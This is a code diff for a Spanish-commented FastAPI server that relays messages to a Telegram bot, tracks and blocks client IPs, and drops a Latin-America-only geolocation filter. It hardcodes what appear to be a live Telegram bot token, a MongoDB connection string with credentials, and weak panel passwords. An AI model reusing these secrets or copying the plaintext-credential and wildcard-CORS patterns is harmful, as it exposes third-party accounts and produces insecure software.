@@ -28,29 +28,31 @@ import ipaddress
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-# Cache y configuraciones globales
-CACHE_TTL = 300  # 5 minutos
-ip_cache: Dict[str, tuple] = {}  # Cache para verificación de país
+# =====================
+#  Config y Caches
+# =====================
+
+# (Eliminado CACHE_TTL e ip_cache por quitar geolocalización)
 blocked_ips_cache: Set[str] = set()  # Cache para IPs bloqueadas
-user_cache: Dict[str, int] = {}  # Cache para números de usuario
-ip_number_cache: Dict[str, int] = {}  # Cache para números de IP
+user_cache: Dict[str, int] = {}      # Cache para números de usuario
+ip_number_cache: Dict[str, int] = {} # Cache para números de IP
 
 # Configuraciones de concurrencia
 MAX_CONCURRENT_REQUESTS = 100  # Máximo de solicitudes concurrentes
-MAX_DB_CONNECTIONS = 20  # Máximo de conexiones a BD concurrentes
-MAX_HTTP_CONNECTIONS = 50  # Máximo de conexiones HTTP concurrentes
-REQUEST_TIMEOUT = 30  # Timeout para requests en segundos
+MAX_DB_CONNECTIONS = 20        # Máximo de conexiones a BD concurrentes
+MAX_HTTP_CONNECTIONS = 50      # Máximo de conexiones HTTP concurrentes
+REQUEST_TIMEOUT = 30           # Timeout para requests en segundos
 
 # Configuraciones optimizadas para Telegram
-MAX_TELEGRAM_CONCURRENT = 20  # Máximo 20 mensajes simultáneos
-MAX_TELEGRAM_QUEUE_SIZE = 1000  # Cola grande para picos de tráfico
-TELEGRAM_TIMEOUT = 10.0  # Timeout por mensaje
-TELEGRAM_RETRY_DELAY = 0.5  # Delay entre reintentos
-MAX_TELEGRAM_RETRIES = 2  # Máximo reintentos por mensaje
+MAX_TELEGRAM_CONCURRENT = 20   # Máximo 20 mensajes simultáneos
+MAX_TELEGRAM_QUEUE_SIZE = 1000 # Cola grande para picos de tráfico
+TELEGRAM_TIMEOUT = 10.0        # Timeout por mensaje
+TELEGRAM_RETRY_DELAY = 0.5     # Delay entre reintentos
+MAX_TELEGRAM_RETRIES = 2       # Máximo reintentos por mensaje
 
 # Rate limiting por bot (para evitar límites de Telegram API)
 RATE_LIMIT_MESSAGES_PER_MINUTE = 30  # Por bot
-RATE_LIMIT_MESSAGES_PER_SECOND = 1  # Por bot
+RATE_LIMIT_MESSAGES_PER_SECOND = 1   # Por bot
 
 # Semáforos para controlar concurrencia
 request_semaphore = Semaphore(MAX_CONCURRENT_REQUESTS)
@@ -73,129 +75,74 @@ telegram_stats = {
     "total_processed": 0
 }
 
-# Configuraciones originales
+# Configuraciones originales (provistas por el usuario)
 TOKEN = "8061450462:AAH2Fu5UbCeif5SRQ8-PQk2gorhNVk8lk6g"
 AUTH_USERNAME = "gato"
 AUTH_PASSWORD = "Gato1234@"
 numeros_r = frozenset({4, 6, 9})
 iprandom = frozenset({4, 6, 9})
 
-# Países de Latinoamérica permitidos
-PAISES_LATINOAMERICA = frozenset({
-    'AR',  # Argentina
-    'BO',  # Bolivia
-    'BR',  # Brasil
-    'CL',  # Chile
-    'CO',  # Colombia
-    'CR',  # Costa Rica
-    'CU',  # Cuba
-    'DO',  # República Dominicana
-    'EC',  # Ecuador
-    'SV',  # El Salvador
-    'GT',  # Guatemala
-    'HN',  # Honduras
-    'MX',  # México
-    'NI',  # Nicaragua
-    'PA',  # Panamá
-    'PY',  # Paraguay
-    'PE',  # Perú
-    'UY',  # Uruguay
-    'VE',  # Venezuela
-    'PR',  # Puerto Rico
-    'GF',  # Guayana Francesa
-    'GY',  # Guyana
-    'SR',  # Suriname
-    'BZ',  # Belice
-    'JM',  # Jamaica
-    'HT',  # Haití
-    'TT',  # Trinidad y Tobago
-    'BB',  # Barbados
-    'GD',  # Granada
-    'LC',  # Santa Lucía
-    'VC',  # San Vicente y las Granadinas
-    'DM',  # Dominica
-    'AG',  # Antigua y Barbuda
-    'KN',  # San Cristóbal y Nieves
-    'BS',  # Bahamas
-})
+# =====================
+#  Utilidades de IP (sin geolocalización)
+# =====================
 
-# Función mejorada para obtener IP real en Vercel
 def is_valid_ip(ip: str) -> bool:
     """
     Valida si una cadena es una IP válida (IPv4 o IPv6)
     Excluye IPs privadas/locales que pueden aparecer en proxies
     """
     try:
-        # Parsear la IP
         ip_obj = ipaddress.ip_address(ip)
-        
-        # Excluir IPs privadas/locales/reservadas
         if ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_reserved:
             return False
-            
-        # Excluir rangos específicos problemáticos
         if isinstance(ip_obj, ipaddress.IPv4Address):
-            # Excluir 0.0.0.0 y rangos de documentación
             if ip == "0.0.0.0" or ip.startswith("192.0.2.") or ip.startswith("198.51.100.") or ip.startswith("203.0.113."):
                 return False
-        
         return True
-        
     except (ipaddress.AddressValueError, ValueError):
         return False
 
 def obtener_ip_real(request: Request) -> str:
     """
-    Función optimizada para obtener la IP real del cliente
-    Compatible con Vercel, Azure, Cloudflare y otros proveedores
+    Obtiene la IP real del cliente considerando headers comunes de proxies.
+    (Sin geolocalización, solo detección de IP)
     """
-    # Headers específicos de Vercel
     vercel_headers = [
-        "x-vercel-forwarded-for",  # Header específico de Vercel
-        "x-forwarded-for",         # Header estándar
-        "x-real-ip",              # Nginx/otros proxies
+        "x-vercel-forwarded-for",
+        "x-forwarded-for",
+        "x-real-ip",
     ]
-    
-    # Headers adicionales para otros proveedores
     additional_headers = [
-        "cf-connecting-ip",        # Cloudflare
-        "x-client-ip",            # Otros proxies
-        "x-forwarded",            # Alternativo
-        "forwarded-for",          # Estándar RFC
-        "forwarded",              # RFC 7239
-        "x-cluster-client-ip",    # Clusters
-        "x-original-forwarded-for", # Algunos balanceadores
+        "cf-connecting-ip",
+        "x-client-ip",
+        "x-forwarded",
+        "forwarded-for",
+        "forwarded",
+        "x-cluster-client-ip",
+        "x-original-forwarded-for",
     ]
-    
     all_headers = vercel_headers + additional_headers
-    
-    # Intentar obtener IP de headers en orden de prioridad
+
     for header in all_headers:
         value = request.headers.get(header)
         if value:
-            # Manejar múltiples IPs (formato: "ip1, ip2, ip3")
             ips = [ip.strip() for ip in value.split(",")]
             for ip in ips:
                 if ip and is_valid_ip(ip):
                     logger.info(f"IP obtenida de header '{header}': {ip}")
                     return ip
-    
-    # Fallback: usar IP del cliente directo
+
     client_ip = getattr(request.client, 'host', None) if request.client else None
     if client_ip and is_valid_ip(client_ip):
         logger.info(f"IP obtenida del cliente directo: {client_ip}")
         return client_ip
-    
-    # Último recurso: IP por defecto para desarrollo/testing
+
     fallback_ip = "127.0.0.1"
     logger.warning(f"No se pudo obtener IP real, usando fallback: {fallback_ip}")
     return fallback_ip
 
 def debug_headers(request: Request) -> dict:
-    """
-    Función para debugear headers en Vercel
-    Útil para identificar qué headers están disponibles
-    """
+    """Devuelve headers útiles para debug de IP (sin geo)."""
     debug_info = {
         "all_headers": dict(request.headers),
         "client_info": {
@@ -208,103 +155,80 @@ def debug_headers(request: Request) -> dict:
             "scheme": request.url.scheme,
         }
     }
-    
-    # Verificar headers específicos de IP
     ip_headers = [
         "x-vercel-forwarded-for",
-        "x-forwarded-for", 
+        "x-forwarded-for",
         "x-real-ip",
         "cf-connecting-ip",
         "x-client-ip"
     ]
-    
     debug_info["ip_headers"] = {}
     for header in ip_headers:
         value = request.headers.get(header)
         if value:
             debug_info["ip_headers"][header] = value
-    
     return debug_info
 
-# Clase para mensajes de Telegram
+# =====================
+#  Telegram
+# =====================
+
 class TelegramMessage:
-    """Clase para encapsular mensajes de Telegram con prioridad"""
     def __init__(self, mensaje: str, chat_id: str, token: str, priority: int = 1, max_retries: int = MAX_TELEGRAM_RETRIES):
         self.mensaje = mensaje
         self.chat_id = chat_id
         self.token = token
-        self.priority = priority  # 1=normal, 2=alta, 3=crítica
+        self.priority = priority
         self.max_retries = max_retries
         self.attempts = 0
         self.created_at = time.time()
 
 def check_rate_limit(token: str) -> bool:
-    """Verifica si podemos enviar mensaje sin exceder rate limits"""
     current_time = time.time()
     current_second = int(current_time)
-    
     rate_info = bot_rate_limits[token]
-    
-    # Limpiar mensajes antiguos (más de 1 minuto)
-    rate_info["messages"] = [
-        timestamp for timestamp in rate_info["messages"]
-        if timestamp > current_time - 60
-    ]
-    
-    # Verificar límite por minuto
+    rate_info["messages"] = [timestamp for timestamp in rate_info["messages"] if timestamp > current_time - 60]
     if len(rate_info["messages"]) >= RATE_LIMIT_MESSAGES_PER_MINUTE:
         return False
-    
-    # Verificar límite por segundo
     if rate_info["last_second"] == current_second:
         return False
-    
     return True
 
 def record_message_sent(token: str):
-    """Registra que se envió un mensaje para rate limiting"""
     current_time = time.time()
     rate_info = bot_rate_limits[token]
     rate_info["messages"].append(current_time)
     rate_info["last_second"] = int(current_time)
 
 async def _enviar_telegram_optimizado(mensaje_obj: TelegramMessage) -> bool:
-    """Función optimizada para enviar mensajes con rate limiting y reintentos"""
     async with telegram_semaphore:
         for intento in range(mensaje_obj.max_retries + 1):
             try:
-                # Verificar rate limit
                 if not check_rate_limit(mensaje_obj.token):
-                    if intento == 0:  # Solo contar como rate limited en el primer intento
+                    if intento == 0:
                         telegram_stats["rate_limited"] += 1
                     await asyncio.sleep(TELEGRAM_RETRY_DELAY * (intento + 1))
                     continue
-                
-                # Enviar mensaje con timeout
+
                 url = f"https://api.telegram.org/bot{mensaje_obj.token}/sendMessage"
-                payload = {
-                    "chat_id": mensaje_obj.chat_id, 
-                    "text": mensaje_obj.mensaje[:4000]  # Limitar longitud
-                }
-                
+                payload = {"chat_id": mensaje_obj.chat_id, "text": mensaje_obj.mensaje[:4000]}
                 response = await asyncio.wait_for(
                     app.state.http_client.post(url, json=payload),
                     timeout=TELEGRAM_TIMEOUT
                 )
-                
+
                 if response.status_code == 200:
                     record_message_sent(mensaje_obj.token)
                     return True
-                elif response.status_code == 429:  # Too Many Requests
+                elif response.status_code == 429:
                     retry_after = int(response.headers.get('Retry-After', 1))
-                    await asyncio.sleep(min(retry_after, 10))  # Máximo 10 segundos
+                    await asyncio.sleep(min(retry_after, 10))
                     continue
                 else:
                     logger.warning(f"Error Telegram HTTP {response.status_code}")
                     if intento < mensaje_obj.max_retries:
                         await asyncio.sleep(TELEGRAM_RETRY_DELAY * (intento + 1))
                         continue
-                    
             except asyncio.TimeoutError:
                 logger.warning(f"Timeout enviando mensaje Telegram (intento {intento + 1})")
                 if intento < mensaje_obj.max_retries:
@@ -315,18 +239,14 @@ async def _enviar_telegram_optimizado(mensaje_obj: TelegramMessage) -> bool:
                 if intento < mensaje_obj.max_retries:
                     await asyncio.sleep(TELEGRAM_RETRY_DELAY * (intento + 1))
                     continue
-        
         return False
 
-# Worker para procesar tareas en background
 async def background_worker():
-    """Worker que procesa tareas en background sin bloquear el event loop"""
     while True:
         try:
             task = await background_queue.get()
-            if task is None:  # Señal de parada
+            if task is None:
                 break
-            
             func, args, kwargs = task
             try:
                 if asyncio.iscoroutinefunction(func):
@@ -335,30 +255,22 @@ async def background_worker():
                     func(*args, **kwargs)
             except Exception as e:
                 logger.error(f"Error en background worker: {e}")
-            
             background_queue.task_done()
         except Exception as e:
             logger.error(f"Error en background worker loop: {e}")
             await asyncio.sleep(1)
 
-# Worker optimizado para Telegram con múltiples workers
 async def telegram_worker(worker_id: int):
-    """Worker optimizado para procesar mensajes de Telegram"""
     logger.info(f"Telegram worker {worker_id} iniciado")
-    
     while True:
         try:
-            # Esperar mensaje con timeout para permitir shutdown graceful
             mensaje_obj = await asyncio.wait_for(telegram_queue.get(), timeout=5.0)
-            
-            if mensaje_obj is None:  # Señal de parada
+            if mensaje_obj is None:
                 logger.info(f"Telegram worker {worker_id} recibió señal de parada")
                 break
-            
             start_time = time.time()
             success = await _enviar_telegram_optimizado(mensaje_obj)
             processing_time = time.time() - start_time
-            
             if success:
                 telegram_stats["sent_queued"] += 1
                 telegram_stats["total_processed"] += 1
@@ -366,72 +278,45 @@ async def telegram_worker(worker_id: int):
             else:
                 telegram_stats["failed"] += 1
                 logger.error(f"Worker {worker_id}: Falló después de reintentos")
-            
             telegram_queue.task_done()
-            
         except asyncio.TimeoutError:
-            # Timeout normal, continuar loop
             continue
         except Exception as e:
             logger.error(f"Error en telegram worker {worker_id}: {e}")
             await asyncio.sleep(1)
 
-# Función principal para envío híbrido
-async def enviar_telegram_hibrido(mensaje: str, chat_id: str = "-4826186479", token: str = TOKEN, 
-                                 priority: int = 1, force_immediate: bool = False) -> dict:
-    """
-    Sistema híbrido de envío de Telegram:
-    - Intenta envío inmediato si hay capacidad y no hay rate limit
-    - Si no, usa cola con prioridad
-    """
+async def enviar_telegram_hibrido(mensaje: str, chat_id: str = "-4826186479", token: str = TOKEN,
+                                  priority: int = 1, force_immediate: bool = False) -> dict:
     mensaje_obj = TelegramMessage(mensaje, chat_id, token, priority)
-    
-    # Si se fuerza inmediato o hay poca carga, intentar envío directo
     if force_immediate or (telegram_semaphore._value > 5 and telegram_queue.qsize() < 50):
-        # Verificar rate limit rápido
         if check_rate_limit(token):
             try:
                 success = await asyncio.wait_for(
                     _enviar_telegram_optimizado(mensaje_obj),
                     timeout=TELEGRAM_TIMEOUT + 2.0
                 )
-                
                 if success:
                     telegram_stats["sent_immediate"] += 1
                     telegram_stats["total_processed"] += 1
-                    return {
-                        "status": "sent_immediate",
-                        "success": True,
-                        "method": "direct"
-                    }
+                    return {"status": "sent_immediate", "success": True, "method": "direct"}
             except asyncio.TimeoutError:
                 logger.warning("Timeout en envío inmediato, pasando a cola")
             except Exception as e:
                 logger.error(f"Error en envío inmediato: {e}")
-    
-    # Si envío inmediato falló o no fue posible, usar cola
     try:
-        # Usar put_nowait para no bloquear si la cola está llena
         telegram_queue.put_nowait(mensaje_obj)
-        return {
-            "status": "queued",
-            "success": True,
-            "method": "queue",
-            "queue_size": telegram_queue.qsize()
-        }
+        return {"status": "queued", "success": True, "method": "queue", "queue_size": telegram_queue.qsize()}
     except asyncio.QueueFull:
         telegram_stats["queue_full"] += 1
         logger.error("Cola de Telegram llena, mensaje descartado")
-        return {
-            "status": "queue_full",
-            "success": False,
-            "method": "none"
-        }
+        return {"status": "queue_full", "success": False, "method": "none"}
 
-# Pool de conexiones HTTP reutilizable optimizado
+# =====================
+#  Lifespan
+# =====================
+
 @asynccontextmanager
 async def lifespan(app: FastAPI):
-    # Startup
     app.state.http_client = httpx.AsyncClient(
         limits=httpx.Limits(
             max_keepalive_connections=MAX_HTTP_CONNECTIONS,
@@ -440,57 +325,45 @@ async def lifespan(app: FastAPI):
         ),
         timeout=httpx.Timeout(REQUEST_TIMEOUT)
     )
-    
-    # Inicializar BD y caches
     await init_db_async()
     await load_caches()
-    
-    # Iniciar workers en background
     app.state.background_task = asyncio.create_task(background_worker())
-    
-    # Iniciar múltiples workers de Telegram (5 workers concurrentes)
     app.state.telegram_workers = []
-    for i in range(5):  # 5 workers de Telegram
+    for i in range(5):
         worker = asyncio.create_task(telegram_worker(i))
         app.state.telegram_workers.append(worker)
-    
     logger.info("Aplicación iniciada con 5 workers de Telegram optimizados")
-    
     yield
-    
-    # Shutdown
     logger.info("Cerrando aplicación...")
-    
-    # Parar workers
     await background_queue.put(None)
-    
-    # Parar workers de Telegram
     for _ in range(len(app.state.telegram_workers)):
         await telegram_queue.put(None)
-    
-    # Esperar que terminen los workers
     try:
         await asyncio.wait_for(app.state.background_task, timeout=10.0)
         await asyncio.gather(*app.state.telegram_workers, timeout=10.0)
     except asyncio.TimeoutError:
         logger.warning("Workers no terminaron en tiempo esperado")
-    
-    # Cerrar cliente HTTP
     await app.state.http_client.aclose()
 
 app = FastAPI(lifespan=lifespan)
 
-# Configurar CORS optimizado
+# =====================
+#  CORS
+# =====================
+
 app.add_middleware(
     CORSMiddleware,
     allow_origins=["*"],
     allow_credentials=False,
     allow_methods=["GET", "POST", "PUT", "DELETE"],
     allow_headers=["*"],
-    max_age=3600,  # Cache preflight por 1 hora
+    max_age=3600,
 )
 
-# MongoDB asíncrono con configuración optimizada
+# =====================
+#  MongoDB
+# =====================
+
 client = AsyncIOMotorClient(
     "mongodb+srv://capijose:holas123@servidorsd.7syxtzz.mongodb.net/?retryWrites=true&w=majority&appName=servidorsd",
     maxPoolSize=MAX_DB_CONNECTIONS,
@@ -509,29 +382,29 @@ global_settings = db["global_settings"]
 logs_usuarios = db["logs_usuarios"]
 ip_bloqueadas = db["ip_bloqueadas"]
 
-# Variables de estado globales optimizadas
-cola = deque(maxlen=100)  # Aumentado para mejor tracking
-baneado = deque(maxlen=200)  # Límite para evitar crecimiento infinito
+# =====================
+#  Estado global
+# =====================
+
+cola = deque(maxlen=100)
+baneado = deque(maxlen=200)
 variable = False
 is_active_cache = False
 cache_last_updated = 0
 
-# Funciones helper para manejo de concurrencia
 async def add_background_task(func, *args, **kwargs):
-    """Añade una tarea al queue de background de forma segura"""
     try:
-        await asyncio.wait_for(
-            background_queue.put((func, args, kwargs)),
-            timeout=1.0
-        )
+        await asyncio.wait_for(background_queue.put((func, args, kwargs)), timeout=1.0)
     except asyncio.TimeoutError:
         logger.warning("Queue de background lleno, descartando tarea")
 
-# Inicialización asíncrona de BD optimizada
+# =====================
+#  Inicialización BD / Caches (sin geo)
+# =====================
+
 async def init_db_async():
     async with db_semaphore:
         try:
-            # Crear índices en paralelo con timeouts
             tasks = [
                 asyncio.wait_for(ip_numbers.create_index("ip", unique=True, background=True), timeout=10.0),
                 asyncio.wait_for(user_numbers.create_index("username", unique=True, background=True), timeout=10.0),
@@ -539,110 +412,51 @@ async def init_db_async():
                 asyncio.wait_for(ip_bloqueadas.create_index("ip", background=True), timeout=10.0)
             ]
             await asyncio.gather(*tasks, return_exceptions=True)
-            
-            # Insertar configuración por defecto si no existe
             if not await global_settings.find_one({"id": 1}):
                 await global_settings.insert_one({"id": 1, "is_active": False})
-                
             logger.info("Base de datos inicializada correctamente")
         except Exception as e:
             logger.error(f"Error inicializando BD: {e}")
 
-# Cargar caches al inicio optimizado
 async def load_caches():
     global blocked_ips_cache, is_active_cache, cache_last_updated
-    
     async with db_semaphore:
         try:
-            # Cargar IPs bloqueadas
             blocked_docs = ip_bloqueadas.find({}, {"ip": 1})
             blocked_ips_cache = {doc["ip"] async for doc in blocked_docs}
-            
-            # Cargar estado global
             settings = await global_settings.find_one({"id": 1})
             is_active_cache = settings.get("is_active", False) if settings else False
-            
-            # Cargar números de IP y usuarios más recientes con límite
             ip_docs = ip_numbers.find({}, {"ip": 1, "number": 1}).limit(2000)
             async for doc in ip_docs:
                 ip_number_cache[doc["ip"]] = doc["number"]
-                
             user_docs = user_numbers.find({}, {"username": 1, "number": 1}).limit(2000)
             async for doc in user_docs:
                 user_cache[doc["username"]] = doc["number"]
-                
             cache_last_updated = time.time()
             logger.info(f"Caches cargados: {len(blocked_ips_cache)} IPs bloqueadas, {len(ip_number_cache)} IPs, {len(user_cache)} usuarios")
         except Exception as e:
             logger.error(f"Error cargando caches: {e}")
 
-# Funciones optimizadas con cache y timeout
+# =====================
+#  Helpers BD / Cache
+# =====================
+
 @lru_cache(maxsize=2000)
 def validar_contrasena_cached(contrasena: str) -> bool:
     patron = r"^(?=.*[a-z])(?=.*[A-Z])(?=.*\d).{8,}$"
     return bool(re.match(patron, contrasena))
 
-async def verificar_pais_cached(ip: str) -> tuple[bool, str]:
-    current_time = time.time()
-    
-    # Verificar cache
-    if ip in ip_cache:
-        cached_result, cached_time = ip_cache[ip]
-        if current_time - cached_time < CACHE_TTL:
-            return cached_result
-    
-    async with http_semaphore:
-        url = f"http://ipwhois.app/json/{ip}"
-        try:
-            response = await asyncio.wait_for(
-                app.state.http_client.get(url), 
-                timeout=5.0
-            )
-            if response.status_code == 200:
-                data = response.json()
-                country = data.get('country_code', 'Unknown')
-                
-                # Solo permitir países de Latinoamérica
-                if country in PAISES_LATINOAMERICA:
-                    result = (True, country)
-                else:
-                    result = (False, country)
-                
-                # Actualizar cache con límite de tamaño
-                if len(ip_cache) > 5000:
-                    # Limpiar cache viejo
-                    old_keys = [k for k, (_, t) in ip_cache.items() if current_time - t > CACHE_TTL * 2]
-                    for k in old_keys[:1000]:
-                        ip_cache.pop(k, None)
-                
-                ip_cache[ip] = (result, current_time)
-                return result
-            return (False, 'Unknown')
-        except asyncio.TimeoutError:
-            logger.warning(f"Timeout verificando país para IP {ip}")
-            return (False, 'Unknown')
-        except Exception as e:
-            logger.error(f"Error verificando país: {e}")
-            return (False, 'Unknown')
-
-# Funciones de BD optimizadas
 def agregar_elemento_diccionario_cache(ip: str, numero: int):
-    # Limitar tamaño del cache
     if len(ip_number_cache) > 10000:
-        # Remover elementos más viejos (esto es simplificado, en producción usar LRU)
         keys_to_remove = list(ip_number_cache.keys())[:1000]
         for key in keys_to_remove:
             ip_number_cache.pop(key, None)
-    
     ip_number_cache[ip] = numero
 
 async def agregar_elemento_diccionario_async(ip: str, numero: int):
     async with db_semaphore:
         try:
-            await asyncio.wait_for(
-                ip_numbers.insert_one({"ip": ip, "number": numero}),
-                timeout=5.0
-            )
+            await asyncio.wait_for(ip_numbers.insert_one({"ip": ip, "number": numero}), timeout=5.0)
             agregar_elemento_diccionario_cache(ip, numero)
         except asyncio.TimeoutError:
             logger.warning(f"Timeout guardando IP {ip} en BD")
@@ -659,10 +473,7 @@ async def refresh_is_active_cache():
     global is_active_cache, cache_last_updated
     async with db_semaphore:
         try:
-            doc = await asyncio.wait_for(
-                global_settings.find_one({"id": 1}),
-                timeout=3.0
-            )
+            doc = await asyncio.wait_for(global_settings.find_one({"id": 1}), timeout=3.0)
             is_active_cache = bool(doc["is_active"]) if doc else False
             cache_last_updated = time.time()
         except asyncio.TimeoutError:
@@ -673,41 +484,30 @@ async def refresh_is_active_cache():
 def obtener_is_active_cached() -> bool:
     global cache_last_updated, is_active_cache
     current_time = time.time()
-    
-    # Actualizar cache si es muy antiguo (cada 60 segundos)
     if current_time - cache_last_updated > 60:
-        # Usar background task para no bloquear
         asyncio.create_task(refresh_is_active_cache())
-    
     return is_active_cache
 
 def contar_elemento_optimized(cola: deque, elemento: str) -> int:
     return sum(1 for x in cola if x == elemento)
 
-# Middleware optimizado de concurrencia
+# =====================
+#  Middlewares
+# =====================
+
 class ConcurrencyLimitMiddleware(BaseHTTPMiddleware):
-    """Middleware para limitar concurrencia global"""
-    
     async def dispatch(self, request: Request, call_next: Callable):
         try:
-            # Usar timeout para evitar espera indefinida
             async with asyncio.timeout(REQUEST_TIMEOUT):
                 async with request_semaphore:
                     return await call_next(request)
         except asyncio.TimeoutError:
             logger.warning(f"Request timeout para {request.url.path}")
-            return JSONResponse(
-                status_code=503,
-                content={"detail": "Servidor ocupado, intenta más tarde"}
-            )
+            return JSONResponse(status_code=503, content={"detail": "Servidor ocupado, intenta más tarde"})
         except Exception as e:
             logger.error(f"Error en ConcurrencyLimitMiddleware: {e}")
-            return JSONResponse(
-                status_code=500,
-                content={"detail": "Error interno del servidor"}
-            )
+            return JSONResponse(status_code=500, content={"detail": "Error interno del servidor"})
 
-# Middleware optimizado de autenticación básica
 class FastBasicAuthMiddleware(BaseHTTPMiddleware):
     def __init__(self, app, username: str, password: str):
         super().__init__(app)
@@ -717,76 +517,35 @@ class FastBasicAuthMiddleware(BaseHTTPMiddleware):
         if request.url.path.startswith(("/docs", "/redoc")):
             auth = request.headers.get("Authorization")
             if not auth or not auth.endswith(self.auth_string):
-                return Response("Unauthorized", status_code=401, 
-                              headers={"WWW-Authenticate": "Basic"})
+                return Response("Unauthorized", status_code=401, headers={"WWW-Authenticate": "Basic"})
         return await call_next(request)
 
-# Middleware optimizado de bloqueo de IP con filtro geográfico para Vercel
 class VercelOptimizedIPBlockMiddleware(BaseHTTPMiddleware):
+    """Bloqueo por IP (lista) SIN geolocalización."""
     async def dispatch(self, request: Request, call_next: Callable):
         client_ip = obtener_ip_real(request)
-        
-        # Log para debugging en Vercel
         logger.info(f"Cliente IP detectada: {client_ip} para path: {request.url.path}")
 
-        # Verificar cache local de IPs bloqueadas primero
         if client_ip in blocked_ips_cache:
             logger.warning(f"IP bloqueada en cache: {client_ip}")
-            return JSONResponse(
-                status_code=403,
-                content={"detail": "Acceso denegado, la IP está bloqueada", "ip": client_ip}
-            )
-
-        # Excluir ciertos paths del filtro geográfico
-        excluded_paths = {"/docs", "/redoc", "/openapi.json", "/health", "/metrics", "/login", "/debug_ip"}
-        if request.url.path not in excluded_paths:
-            # Solo verificar geolocalización si tenemos una IP válida
-            if client_ip != "127.0.0.1" and is_valid_ip(client_ip):
-                try:
-                    permitido, pais = await asyncio.wait_for(
-                        verificar_pais_cached(client_ip), 
-                        timeout=8.0
-                    )
-                    
-                    if not permitido:
-                        logger.info(f"IP bloqueada por geolocalización: {client_ip} ({pais})")
-                        return JSONResponse(
-                            status_code=403,
-                            content={
-                                "detail": f"Acceso denegado por geolocalización",
-                                "ip": client_ip,
-                                "country": pais
-                            }
-                        )
-                except asyncio.TimeoutError:
-                    logger.warning(f"Timeout verificando geolocalización para IP {client_ip}")
-                    # En Vercel, es mejor permitir acceso en caso de timeout
-                    pass
-                except Exception as e:
-                    logger.error(f"Error verificando geolocalización: {e}")
-                    # En caso de error, permitir acceso
-                    pass
-            else:
-                logger.info(f"Saltando verificación geográfica para IP local/inválida: {client_ip}")
+            return JSONResponse(status_code=403, content={"detail": "Acceso denegado, la IP está bloqueada", "ip": client_ip})
 
         # Asignar número si no existe y es una IP válida
-        if (client_ip not in iprandom and 
-            client_ip not in ip_number_cache and 
-            is_valid_ip(client_ip) and 
-            client_ip != "127.0.0.1"):
+        if (client_ip not in iprandom and client_ip not in ip_number_cache and is_valid_ip(client_ip) and client_ip != "127.0.0.1"):
             numero_random = random.randint(0, 9)
             agregar_elemento_diccionario_cache(client_ip, numero_random)
-            # Guardar en BD en background
             await add_background_task(agregar_elemento_diccionario_async, client_ip, numero_random)
 
         return await call_next(request)
 
-# Añadir middlewares en orden correcto
 app.add_middleware(ConcurrencyLimitMiddleware)
 app.add_middleware(FastBasicAuthMiddleware, username=AUTH_USERNAME, password=AUTH_PASSWORD)
 app.add_middleware(VercelOptimizedIPBlockMiddleware)
 
-# Modelos Pydantic optimizados
+# =====================
+#  Modelos
+# =====================
+
 class ClaveRequest(BaseModel):
     clave: str
 
@@ -799,7 +558,10 @@ class IPRequest(BaseModel):
 class DynamicMessage(BaseModel):
     mensaje: str
 
-# Endpoints optimizados con manejo de concurrencia
+# =====================
+#  Endpoints
+# =====================
+
 @app.get("/login", response_class=HTMLResponse)
 async def login_form():
     return """
@@ -825,59 +587,29 @@ async def login(password: str = Form(...)):
         except:
             return HTMLResponse("<h3>Panel no encontrado</h3>", status_code=404)
     else:
-        return HTMLResponse(
-            "<h3 style='text-align:center;padding-top:100px;'>Contraseña incorrecta</h3>", 
-            status_code=401
-        )
+        return HTMLResponse("<h3 style='text-align:center;padding-top:100px;'>Contraseña incorrecta</h3>", status_code=401)
 
 @app.post("/validar_clave")
 async def validar_clave(data: ClaveRequest):
     return {"valido": data.clave == "gato123"}
 
-# Endpoint de debugging para IPs
 @app.get("/debug_ip")
 async def debug_ip_endpoint(request: Request):
-    """
-    Endpoint para debugear problemas de IP en Vercel
-    """
     debug_info = debug_headers(request)
-    
-    # Intentar obtener IP con la función mejorada
     detected_ip = obtener_ip_real(request)
-    
-    # Verificar geolocalización si es posible
-    geo_info = {}
-    if detected_ip and detected_ip != "127.0.0.1":
-        try:
-            permitido, pais = await verificar_pais_cached(detected_ip)
-            geo_info = {
-                "country": pais,
-                "allowed": permitido,
-                "is_latin_america": pais in PAISES_LATINOAMERICA if pais != 'Unknown' else False
-            }
-        except Exception as e:
-            geo_info = {"error": str(e)}
-    
     return {
         "detected_ip": detected_ip,
         "is_valid_ip": is_valid_ip(detected_ip) if detected_ip else False,
-        "geo_info": geo_info,
+        "geo_info": {"enabled": False},
         "debug_headers": debug_info,
         "platform": "vercel" if "vercel" in request.headers.get("host", "").lower() else "other",
         "timestamp": datetime.utcnow().isoformat()
     }
 
 async def _bloquear_ip_bd(ip: str):
-    """Función auxiliar para bloquear IP en BD con timeout"""
     async with db_semaphore:
         try:
-            await asyncio.wait_for(
-                ip_bloqueadas.insert_one({
-                    "ip": ip, 
-                    "fecha_bloqueo": datetime.utcnow()
-                }),
-                timeout=5.0
-            )
+            await asyncio.wait_for(ip_bloqueadas.insert_one({"ip": ip, "fecha_bloqueo": datetime.utcnow()}), timeout=5.0)
         except asyncio.TimeoutError:
             logger.warning(f"Timeout bloqueando IP {ip} en BD")
         except Exception as e:
@@ -886,23 +618,17 @@ async def _bloquear_ip_bd(ip: str):
 @app.post("/bloquear_ip/")
 async def bloquear_ip(data: IPRequest):
     ip = data.ip.strip()
-    
     if ip not in blocked_ips_cache:
         blocked_ips_cache.add(ip)
-        # Guardar en BD en background
         await add_background_task(_bloquear_ip_bd, ip)
         return {"message": f"La IP {ip} ha sido bloqueada."}
     else:
         return {"message": f"La IP {ip} ya estaba bloqueada."}
 
 async def _desbloquear_ip_bd(ip: str):
-    """Función auxiliar para desbloquear IP en BD con timeout"""
     async with db_semaphore:
         try:
-            await asyncio.wait_for(
-                ip_bloqueadas.delete_one({"ip": ip}),
-                timeout=5.0
-            )
+            await asyncio.wait_for(ip_bloqueadas.delete_one({"ip": ip}), timeout=5.0)
         except asyncio.TimeoutError:
             logger.warning(f"Timeout desbloqueando IP {ip} en BD")
         except Exception as e:
@@ -911,10 +637,8 @@ async def _desbloquear_ip_bd(ip: str):
 @app.post("/desbloquear_ip/")
 async def desbloquear_ip(data: IPRequest):
     ip = data.ip.strip()
-    
     if ip in blocked_ips_cache:
         blocked_ips_cache.discard(ip)
-        # Eliminar de BD en background
         await add_background_task(_desbloquear_ip_bd, ip)
         return {"message": f"La IP {ip} ha sido desbloqueada."}
     else:
@@ -929,7 +653,6 @@ async def read_root():
     return {"message": "API funcionando correctamente!"}
 
